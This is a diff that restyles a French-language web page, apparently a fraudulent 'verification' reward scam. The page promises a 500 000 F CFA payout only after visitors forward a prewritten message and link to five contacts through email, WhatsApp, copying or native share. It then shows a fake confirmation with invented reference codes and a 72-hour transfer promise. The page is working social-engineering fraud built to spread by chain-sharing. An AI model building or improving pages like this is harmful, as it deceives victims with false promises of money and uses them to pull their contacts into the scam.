@@ -3,147 +3,154 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Plateforme de vérification - Dossier en attente</title>
+    <title>Vérification – Dossier en attente</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Sans:wght@300;400;500&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
         }
 
         body {
-            background: #f0f4f8;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 1.5rem;
+            background: #faf8f4;
+            color: #1a1814;
+            font-family: 'DM Sans', sans-serif;
+            font-weight: 300;
+            line-height: 1.5;
         }
 
+        /* Layout principal */
         .app-container {
-            max-width: 700px;
+            max-width: 720px;
             width: 100%;
             margin: 0 auto;
+            padding: 2rem 1.5rem;
         }
 
-        /* Cartes */
+        /* Cartes style épuré */
         .card {
-            background: white;
-            border-radius: 1.25rem;
-            padding: 2rem;
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.02);
-            border: 1px solid #e2e8f0;
+            background: #ffffff;
+            border-radius: 1rem;
+            padding: 2rem 2rem 2.2rem;
+            border: 1px solid rgba(26,24,20,0.08);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.02);
             transition: all 0.2s ease;
         }
 
         .step2-card {
-            border-top: 4px solid #2c7da0;
+            border-top: 3px solid #c4432a;
         }
 
+        /* Typographie */
         h1 {
-            font-size: 1.6rem;
-            font-weight: 600;
-            color: #1e2a3a;
-            margin-bottom: 0.5rem;
-            letter-spacing: -0.2px;
+            font-family: 'DM Serif Display', serif;
+            font-size: 1.9rem;
+            font-weight: 400;
+            letter-spacing: -0.3px;
+            color: #1a1814;
+            margin-bottom: 0.75rem;
+            line-height: 1.2;
         }
 
         .subhead {
-            color: #334155;
             font-size: 0.95rem;
-            border-left: 3px solid #3b82f6;
-            padding-left: 1rem;
+            color: #5a5550;
+            background: #faf8f4;
+            padding: 1rem;
+            border-radius: 0.75rem;
             margin: 1.2rem 0;
-            background: #f8fafc;
-            border-radius: 0.5rem;
-            padding: 0.8rem 1rem;
-            line-height: 1.4;
+            border-left: 3px solid #c4432a;
+            line-height: 1.5;
         }
 
         .message-box {
-            background: #f9f9fb;
-            border-radius: 1rem;
+            background: #fdfcfa;
+            border: 1px solid rgba(26,24,20,0.08);
+            border-radius: 0.75rem;
             padding: 1.2rem;
-            margin: 1.5rem 0;
-            border: 1px solid #e2edf2;
+            margin: 1.8rem 0;
         }
 
         .message-label {
-            font-weight: 600;
-            color: #0f3b4c;
-            margin-bottom: 0.6rem;
-            font-size: 0.85rem;
+            font-family: 'DM Mono', monospace;
+            font-size: 0.7rem;
             text-transform: uppercase;
-            letter-spacing: 0.3px;
+            letter-spacing: 1.5px;
+            color: #8a8580;
+            margin-bottom: 0.75rem;
         }
 
         .message-content {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.8rem;
             background: white;
             padding: 1rem;
-            border-radius: 0.75rem;
-            font-family: 'SF Mono', 'Menlo', monospace;
-            font-size: 0.85rem;
-            border: 1px solid #e2e8f0;
+            border-radius: 0.5rem;
+            border: 1px solid rgba(26,24,20,0.05);
+            line-height: 1.6;
+            color: #1a1814;
             word-break: break-word;
-            color: #1e293b;
-            margin-bottom: 1rem;
-            line-height: 1.5;
         }
 
         .share-buttons-group {
             display: flex;
             flex-wrap: wrap;
             gap: 10px;
-            margin: 20px 0 16px;
+            margin: 20px 0 18px;
             justify-content: center;
         }
 
         .btn-share {
             background: white;
-            border: 1px solid #cbd5e1;
+            border: 1px solid rgba(26,24,20,0.15);
             padding: 8px 14px;
-            border-radius: 40px;
-            font-weight: 500;
+            border-radius: 60px;
+            font-family: 'DM Sans', sans-serif;
+            font-weight: 400;
             font-size: 0.8rem;
             cursor: pointer;
-            transition: 0.2s;
-            color: #1f4662;
+            transition: all 0.2s ease;
+            color: #2c5f5f;
             box-shadow: 0 1px 1px rgba(0,0,0,0.02);
         }
 
         .btn-share:hover {
-            background: #eef2ff;
-            border-color: #3b82f6;
+            background: #f3f0ea;
+            border-color: #c4432a;
+            color: #c4432a;
         }
 
         .btn-primary {
-            background: #2563eb;
+            background: #c4432a;
             border: none;
             padding: 12px 20px;
-            border-radius: 40px;
-            font-weight: 600;
+            border-radius: 60px;
+            font-family: 'DM Sans', sans-serif;
+            font-weight: 500;
             font-size: 0.9rem;
             color: white;
             width: 100%;
             cursor: pointer;
             transition: background 0.2s;
-            margin-top: 20px;
+            margin-top: 24px;
             letter-spacing: 0.2px;
         }
 
         .btn-primary:hover {
-            background: #1d4ed8;
+            background: #a3341f;
         }
 
         .info-note {
             font-size: 0.7rem;
-            color: #5b6e8c;
-            background: #f1f5f9;
-            padding: 8px 12px;
-            border-radius: 16px;
+            color: #7a7570;
+            background: #faf8f4;
+            padding: 10px 12px;
+            border-radius: 40px;
             text-align: center;
             margin-top: 1rem;
+            line-height: 1.4;
         }
 
         .toast-msg {
@@ -151,56 +158,65 @@
             bottom: 30px;
             left: 50%;
             transform: translateX(-50%);
-            background: #1e293b;
-            color: #e2e8f0;
+            background: #1a1814;
+            color: #e2dfda;
             padding: 8px 18px;
-            border-radius: 30px;
+            border-radius: 40px;
             font-size: 0.8rem;
-            font-weight: 400;
+            font-family: 'DM Sans', sans-serif;
             z-index: 1000;
             opacity: 0;
             transition: opacity 0.2s;
             pointer-events: none;
             white-space: nowrap;
             backdrop-filter: blur(4px);
+            font-weight: 300;
         }
 
         hr {
             margin: 1rem 0;
-            border: 0;
+            border: none;
             height: 1px;
-            background: #e2e8f0;
+            background: rgba(26,24,20,0.08);
         }
 
-        .badge {
-            background: #eef2ff;
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 0.7rem;
-            color: #1e40af;
+        .reward-badge {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.65rem;
+            letter-spacing: 2px;
+            background: #faf8f4;
             display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            color: #c4432a;
+            margin-bottom: 1rem;
+        }
+
+        .highlight {
+            font-weight: 600;
+            color: #c4432a;
+            font-size: 1.6rem;
+            font-family: 'DM Serif Display', serif;
         }
 
         .footer-note {
             font-size: 0.7rem;
             text-align: center;
             margin-top: 1.5rem;
-            color: #6c7a91;
-            border-top: 1px solid #eef2f0;
-            padding-top: 1rem;
-        }
-
-        .highlight {
-            font-weight: 700;
-            color: #1e5f6b;
+            color: #8a8580;
+            border-top: 1px solid rgba(26,24,20,0.06);
+            padding-top: 1.2rem;
         }
 
         @media (max-width: 550px) {
+            .app-container {
+                padding: 1rem;
+            }
             .card {
                 padding: 1.5rem;
             }
             h1 {
-                font-size: 1.4rem;
+                font-size: 1.6rem;
             }
             .share-buttons-group {
                 gap: 6px;
@@ -213,26 +229,25 @@
     </style>
 </head>
 <body>
+
 <div class="app-container">
-    <!-- Étape 1 – Reçu / Demande de partage -->
+    <!-- ÉTAPE 1 : Merci + partage requis -->
     <div id="step1Container" class="card">
-        <div style="margin-bottom: 0.5rem;">
-            <span class="badge">Dossier #F-500K-0425</span>
-        </div>
-        <h1>Merci pour l’envoi de vos informations</h1>
+        <div class="reward-badge">Dossier #500K-2404</div>
+        <h1>Merci d’avoir soumis vos informations</h1>
         <div class="subhead">
-            Votre dossier a bien été enregistré. Pour finaliser la vérification et permettre le traitement de votre récompense de <strong>500 000 F CFA</strong>, vous devez partager le message ci-dessous à <strong>5 contacts distincts</strong> (par email, WhatsApp, ou copie).
+            Votre dossier a bien été reçu. Pour finaliser le traitement et débloquer la récompense de <strong>500 000 F CFA</strong>, vous devez partager le message ci-dessous à <strong>5 contacts distincts</strong> (email, WhatsApp, copie).
         </div>
 
         <div class="message-box">
-            <div class="message-label">Message à transmettre (copiez ou utilisez les boutons)</div>
+            <div class="message-label">Message à transmettre (copiez ou partagez)</div>
             <div class="message-content" id="shareMessageText">
                 Bonjour,<br><br>
                 Je viens de finaliser une procédure sur la plateforme de vérification. Suite à l’évaluation de mon dossier, une récompense de 500 000 F CFA m’a été attribuée. Vous pouvez également bénéficier du programme en suivant le lien ci-dessous :<br><br>
                 🔗 https://verification-offre.promo/partage<br><br>
                 Cordialement.
             </div>
-            <div style="font-size: 0.75rem; color: #2c5a74; background:#f1f6fa; border-radius: 20px; padding: 4px 12px; display: inline-block;">
+            <div style="font-size: 0.7rem; color: #7a7570; background: #faf8f4; border-radius: 30px; padding: 4px 12px; display: inline-block; margin-top: 12px;">
                 Transmettez ce message à 5 contacts minimum
             </div>
         </div>
@@ -245,36 +260,34 @@
         </div>
 
         <div class="info-note">
-            Après avoir partagé le message à au moins 5 personnes, cliquez sur le bouton de confirmation ci-dessous. Le système vérifiera l’étape de partage.
+            Après avoir partagé à au moins 5 personnes, cliquez sur le bouton de confirmation ci-dessous.
         </div>
 
         <button class="btn-primary" id="confirmShareBtn">
             J’ai partagé à 5 contacts – Valider
         </button>
         <div class="footer-note">
-            Une nouvelle page de confirmation s’affichera après validation.
+            Une page de confirmation s’affichera après validation.
         </div>
     </div>
 
-    <!-- Étape 2 – Confirmation de traitement sous 72h -->
+    <!-- ÉTAPE 2 : Récompense sous 72h -->
     <div id="step2Container" class="card step2-card" style="display: none;">
-        <div>
-            <span class="badge">Accusé de validation</span>
-        </div>
-        <h1>Dossier finalisé</h1>
-        <div style="font-size: 1rem; margin: 0.8rem 0; font-weight: 500; color: #2563eb; text-align: center;">
+        <div class="reward-badge">Validation finale</div>
+        <h1>Dossier clos – versement engagé</h1>
+        <div style="font-size: 1rem; margin: 1rem 0 0.5rem; font-weight: 400; color: #c4432a; text-align: center;">
             Montant attribué : <span class="highlight">500 000 F CFA</span>
         </div>
-        <div style="background: #f8fafc; border-radius: 1rem; padding: 1.2rem; text-align: left; margin: 1rem 0;">
-            <p style="font-weight: 500;">Délai de versement : 72 heures maximum</p>
-            <p style="margin-top: 0.6rem; font-size: 0.9rem;">Notre service financier procède au traitement de votre dossier. Le transfert sera effectué vers le moyen de paiement que vous avez renseigné (compte mobile, virement bancaire ou espèce).</p>
+        <div style="background: #fdfcfa; border-radius: 1rem; padding: 1.2rem; text-align: left; margin: 1rem 0;">
+            <p style="font-weight: 500; font-family: 'DM Sans', sans-serif;">Délai de versement : 72 heures maximum</p>
+            <p style="margin-top: 0.5rem; font-size: 0.9rem; color: #2c2a28;">Notre service financier procède au traitement de votre dossier. Le transfert sera effectué vers le moyen de paiement que vous avez renseigné (compte mobile, virement bancaire).</p>
             <hr>
-            <p style="font-size: 0.85rem;">Référence de confirmation : VF-500K-72H<br>Un email récapitulatif vous parviendra sous 24h.</p>
+            <p style="font-size: 0.85rem; color: #5a5550;">Référence de confirmation : VF-500K-72H<br>Un email récapitulatif vous parviendra sous 24h.</p>
         </div>
-        <div style="text-align: center; margin-top: 5px; font-size: 0.8rem; color: #2c6280;">
+        <div style="text-align: center; margin-top: 5px; font-size: 0.75rem; color: #2c5f5f;">
             Code de suivi : PART500-OFF
         </div>
-        <div style="font-size: 0.7rem; text-align: center; margin-top: 20px; color: #64748b;">
+        <div style="font-size: 0.7rem; text-align: center; margin-top: 20px; color: #8a8580;">
             En cas de délai anormal, contactez support@verification-offre.com avec votre numéro de dossier.
         </div>
     </div>
@@ -293,7 +306,7 @@
         const shareNativeBtn = document.getElementById('shareNativeBtn');
         const toast = document.getElementById('toastNotification');
 
-        // Message épuré (sans emojis, style professionnel)
+        // Message épuré (sans emojis)
         const shareMessage = "Bonjour,\n\nJe viens de finaliser une procédure sur la plateforme de vérification. Suite à l’évaluation de mon dossier, une récompense de 500 000 F CFA m’a été attribuée. Vous pouvez également bénéficier du programme en suivant le lien ci-dessous :\n\nhttps://verification-offre.promo/partage\n\nCordialement.";
 
         function showToast(message, duration = 2500) {
@@ -304,7 +317,6 @@
             }, duration);
         }
 
-        // Email
         function shareViaEmail() {
             const subject = encodeURIComponent("Information concernant un programme de vérification");
             const body = encodeURIComponent(shareMessage + "\n\n(Message transmis dans le cadre d’une validation)");
@@ -312,14 +324,12 @@
             showToast("Client email ouvert – envoyez à 5 contacts.", 2500);
         }
 
-        // WhatsApp
         function shareViaWhatsApp() {
             const text = encodeURIComponent(shareMessage);
             window.open(`https://wa.me/?text=${text}`, '_blank');
             showToast("WhatsApp ouvert – sélectionnez 5 destinataires.", 2800);
         }
 
-        // Copie
         function copyMessage() {
             navigator.clipboard.writeText(shareMessage).then(() => {
                 showToast("Message copié – vous pouvez le coller et l’envoyer.", 2500);
@@ -334,7 +344,6 @@
             });
         }
 
-        // Partage natif
         function nativeShare() {
             if (navigator.share) {
                 navigator.share({
@@ -352,7 +361,6 @@
             }
         }
 
-        // Variable pour suivi simplifié (optionnel, sans contrainte agressive)
         let shareActionCount = 0;
         function trackShare() {
             shareActionCount++;
@@ -361,13 +369,11 @@
             }
         }
 
-        // Événements avec tracking
         shareEmailBtn.onclick = (e) => { e.preventDefault(); shareViaEmail(); trackShare(); };
         shareWhatsAppBtn.onclick = (e) => { e.preventDefault(); shareViaWhatsApp(); trackShare(); };
         shareCopyBtn.onclick = (e) => { e.preventDefault(); copyMessage(); trackShare(); };
         shareNativeBtn.onclick = (e) => { e.preventDefault(); nativeShare(); trackShare(); };
 
-        // Confirmation finale
         confirmBtn.addEventListener('click', function(e) {
             if (shareActionCount === 0) {
                 const userConfirmed = confirm("Vous n’avez pas encore utilisé les outils de partage. Avez-vous bien transmis le message à 5 personnes ?\nCliquez sur OK si c’est déjà fait, sinon partagez d’abord.");
@@ -375,11 +381,9 @@
             }
             step1.style.display = 'none';
             step2.style.display = 'block';
-            // Suppression totale des confettis / animations exagérées
             window.scrollTo({ top: 0, behavior: 'smooth' });
         });
 
-        // État initial
         step2.style.display = 'none';
     })();
 </script>
